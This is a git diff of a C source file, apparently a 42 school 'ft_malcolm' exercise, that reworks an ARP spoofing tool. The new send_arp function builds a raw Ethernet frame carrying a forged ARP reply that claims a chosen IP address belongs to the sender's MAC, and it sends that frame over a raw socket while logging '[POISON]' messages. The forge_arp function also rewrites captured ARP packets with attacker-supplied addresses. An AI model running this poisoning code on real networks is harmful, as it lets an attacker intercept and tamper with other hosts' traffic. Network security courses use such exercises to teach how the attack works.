@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   malcolm.c                                          :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
+/*   By: nicolas <nicolas@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
-/*   Updated: 2025/11/18 17:24:32 by nponchon         ###   ########.fr       */
+/*   Updated: 2025/11/20 16:53:50 by nicolas          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,25 +14,21 @@
 
 extern int g_sigint;
 
-struct ether_arp	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
+void	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
 {
 	struct ether_arp forged_arp;
 
 	ft_memcpy(&forged_arp, original_arp, sizeof(struct ether_arp));
 	forged_arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
 
-	// Set sender MAC and IP to attacker's values
 	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
 		&forged_arp.arp_sha[0], &forged_arp.arp_sha[1], &forged_arp.arp_sha[2],
 		&forged_arp.arp_sha[3], &forged_arp.arp_sha[4], &forged_arp.arp_sha[5]);
-
 	inet_pton(AF_INET, m->source_ip, forged_arp.arp_spa);
 
-	// Set target MAC and IP to victim's values
 	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
 		&forged_arp.arp_tha[0], &forged_arp.arp_tha[1], &forged_arp.arp_tha[2],
 		&forged_arp.arp_tha[3], &forged_arp.arp_tha[4], &forged_arp.arp_tha[5]);
-
 	inet_pton(AF_INET, m->target_ip, forged_arp.arp_tpa);
 
 	printf("Forged ARP reply:\n");
@@ -46,42 +42,62 @@ struct ether_arp	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
 	printf("  Target IP: %s\n", m->target_ip);
 	printf("  Operation: ARP Reply\n");
 
-	return (forged_arp);
 }
 
+#include <sys/ioctl.h>
 void	send_arp(t_malcolm *m, unsigned char *buf)
 {
-	struct sockaddr_ll dest_addr = {0};
-	dest_addr.sll_ifindex = if_nametoindex("eth0");
-	printf("Interface index: %d\n", dest_addr.sll_ifindex);
-	dest_addr.sll_halen = ETH_ALEN; // Ethernet address length
-	ft_memcpy(dest_addr.sll_addr, m->target_mac, ETH_ALEN); // Set target MAC address
+	(void)buf; // Unused parameter for now
 
-	struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ether_header));
-	char sender_ip[INET_ADDRSTRLEN];
-    char target_ip[INET_ADDRSTRLEN];
+	int ifindex = if_nametoindex("eth0");
+	if (ifindex == 0) {
+		fprintf(stderr, "if_nametoindex failed");
+		return;
+	}
 
-    inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
-    inet_ntop(AF_INET, arp->arp_tpa, target_ip, sizeof(target_ip));
-	printf("Sending forged ARP reply to %s\n", target_ip);
+	unsigned char src_mac[6];
+	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+		&src_mac[0], &src_mac[1], &src_mac[2], &src_mac[3], &src_mac[4], &src_mac[5]);
 
-	struct ether_arp forged_arp = forge_arp(arp, m);
+	//unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+	unsigned char broadcast_mac[6];
+	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+		&broadcast_mac[0], &broadcast_mac[1], &broadcast_mac[2],
+		&broadcast_mac[3], &broadcast_mac[4], &broadcast_mac[5]);
 
-	struct ether_header eth_hdr;
-    memcpy(eth_hdr.ether_dhost, m->target_mac, ETH_ALEN); // Target MAC
-    memcpy(eth_hdr.ether_shost, m->source_mac, ETH_ALEN); // Spoofer's MAC
-    eth_hdr.ether_type = htons(ETHERTYPE_ARP); // ARP EtherType
+	struct ether_header eth;
+	ft_memcpy(eth.ether_shost, src_mac, 6);
+	ft_memcpy(eth.ether_dhost, broadcast_mac, 6);
+	eth.ether_type = htons(ETH_P_ARP);
 
-    // Combine Ethernet header and ARP payload
-    unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
-    memcpy(packet, &eth_hdr, sizeof(struct ether_header)); // Copy Ethernet header
-    memcpy(packet + sizeof(struct ether_header), &forged_arp, sizeof(struct ether_arp)); // Copy ARP payload
+	struct ether_arp arp;
+	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+	arp.ea_hdr.ar_pro = htons(ETH_P_IP);
+	arp.ea_hdr.ar_hln = 6;
+	arp.ea_hdr.ar_pln = 4;
+	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
+	ft_memcpy(arp.arp_sha, src_mac, 6);
+	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
+	// For gratuitous ARP: target is same as source (self-announcement)
+	ft_memcpy(arp.arp_tha, src_mac, 6);
+	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);
 
-	ssize_t bytes_sent = sendto(m->socket, &forged_arp, sizeof(forged_arp), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
+	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+	ft_memcpy(packet, &eth, sizeof(eth));
+	ft_memcpy(packet + sizeof(eth), &arp, sizeof(arp));
+
+	struct sockaddr_ll sll = {0};
+	sll.sll_ifindex = ifindex;
+	sll.sll_halen = 6;
+	ft_memcpy(sll.sll_addr, broadcast_mac, 6);
+
+	printf("[POISON] Sending gratuitous ARP: '%s is at %s'\n", m->source_ip, m->source_mac);
+
+	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
 	if (bytes_sent < 0) {
-		perror("sendto failed");
+		fprintf(stderr, "Error: sendto failed\n");
 	} else {
-		printf("Successfully sent forged ARP reply (%zd bytes)\n", bytes_sent);
+		printf("[POISON] Successfully sent (%zd bytes)\n", bytes_sent);
 	}
 }
 
@@ -122,6 +138,7 @@ int	listen_arp(t_malcolm *m)
     }
 
 	print_arp(buf);
+	sleep(1);
 	send_arp(m, buf);
 
     return (0);
